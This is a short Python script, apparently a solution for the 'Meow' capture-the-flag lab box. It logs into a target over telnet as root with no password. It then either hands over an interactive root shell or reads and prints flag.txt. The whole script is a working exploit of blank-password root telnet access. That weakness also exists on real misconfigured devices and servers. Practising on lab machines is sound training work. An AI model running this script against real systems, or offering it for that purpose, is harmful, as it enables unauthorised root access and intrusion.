import sys
import telnetlib

def shell_mode(host):
    """Interactive shell mode - gives full terminal access"""
    print(f"[*] Connection to {host}...")
    
    try:
        # Init of telnet connection
        tn = telnetlib.Telnet(host)

        # Reading until the login prompt (Specific to Meow Box)
        tn.read_until(b"login: ")
        
        # Sending user 'root'
        print("[*] Sending user 'root'...")
        tn.write(b"root\n")

        # Passing to interactive mode for shell access
        print("[+] Shell interactive found !\n")
        tn.interact()

    except Exception as e:
        print(f"[-] Error : {e}")


def flag_mode(host):
    """Flag extraction mode - automatically retrieves flag.txt"""
    print(f"[*] Connection to {host}...")
    
    try:
        # Init of telnet connection
        tn = telnetlib.Telnet(host)

        # Reading until the login prompt (Specific to Meow Box)
        tn.read_until(b"login: ")
        
        # Sending user 'root'
        print("[*] Sending user 'root'...")
        tn.write(b"root\n")

        # Wait for shell prompt
        tn.read_until(b"#")
        
        # Send command to read flag
        print("[*] Retrieving flag.txt...")
        tn.write(b"cat flag.txt\n")
        
        # Read the flag output
        flag_output = tn.read_until(b"#")
        flag_content = flag_output.decode('utf-8').strip()
        
        # Extract and display the flag
        lines = flag_content.split('\n')
        if len(lines) > 0:
            flag = lines[1]
            print(f"\n[+] FLAG FOUND :\n{flag}\n")
        
        tn.close()

    except Exception as e:
        print(f"[-] Error : {e}")


# Argument verification
if len(sys.argv) < 3:
    print(f"Usage: python3 {sys.argv[0]} <-s|-f> <TARGET_IP>")
    print(f"  -s : Interactive shell mode")
    print(f"  -f : Flag extraction mode")
    sys.exit(1)

mode = sys.argv[1]
host = sys.argv[2]

# Route to appropriate mode
if mode == "-s":
    shell_mode(host)
elif mode == "-f":
    flag_mode(host)
else:
    print(f"[-] Invalid flag '{mode}'. Use -s or -f")
    sys.exit(1)
